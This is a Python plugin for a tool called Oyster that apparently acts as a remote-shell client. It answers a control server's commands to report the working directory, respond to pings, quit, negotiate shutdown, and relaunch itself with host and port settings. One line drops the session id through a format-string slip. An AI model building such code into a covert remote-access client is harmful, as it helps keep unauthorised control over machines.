import shlex
import sys
import subprocess
import socket
from time import sleep
from os import getcwd
from os.path import realpath
from client import LoopController


class Plugin(object):
    version = 'v1.0'
    invocation = 'oyster'
    enabled = True
    required = True

    def run(self, client, data):
        args = shlex.split(data)

        if not args:
            client.server_print('Oyster requires arguments to run.\n')
            return

        if args[0] == 'getcwd':
            self.send_data_with_cwd(client, '')
            return

        if args[0] == 'ping':
            client.send_data('pong\n')
            return

        if args[0] == 'quit' or args[0] == 'exit':
            client.send_data('confirmed')
            sleep(1)
            lc = LoopController()
            lc.should_break = True
            return lc

        # Check to see if the client should send the
        # server shutdown confirmation.
        if args[0] == 'server_shutdown?':
            self.negotiate_server_shutdown(client)
            return

        if args[0] == 'reboot':
            client.send_data('')
            self.reboot(client)
            sys.exit()

        return

    def negotiate_server_shutdown(self, client):
        """
        Negotiate a server shutdown.

        :return:
        """

        if client.server_shutdown:
            client.send_data('Y')
            client.sock.close()
            if client.shutdown_kill:
                sys.exit()
            client.reboot_self()
        else:
            client.send_data('N')
        return client

    def send_data_with_cwd(self, client, some_data):
        """
        Send something back to the control server with the current
        working directory appended to the end of it.

        :param some_data:
        :return:
        """

        client.sock.send(str.encode(some_data + str(getcwd()) + '> ' + '~!_TERM_$~'))
        return self

    def reboot(self, client):
        """
        Reboot the client.

        :return:
        """

        try:
            client.sock.close()
        except socket.error:
            pass

        rc = [
            sys.executable,
            'port={}'.format(client.port),
            'host={}'.format(client.host),
            'recv_size={}'.format(client.recv_size),
            'server_shutdown={}'.format(client.server_shutdown),
            'session_id='.format(client.session_id)
        ]

        try:
            popen_rc = [sys.executable] + list(sys.argv)
            p = subprocess.Popen(popen_rc)
            p.communicate()
        except PermissionError:
            from os import execv
            print('Using execv...')
            rc.pop(0)
            rc.insert(0, realpath(__file__))
            rc.insert(0, '')
            execv(sys.executable, rc)

        sys.exit()

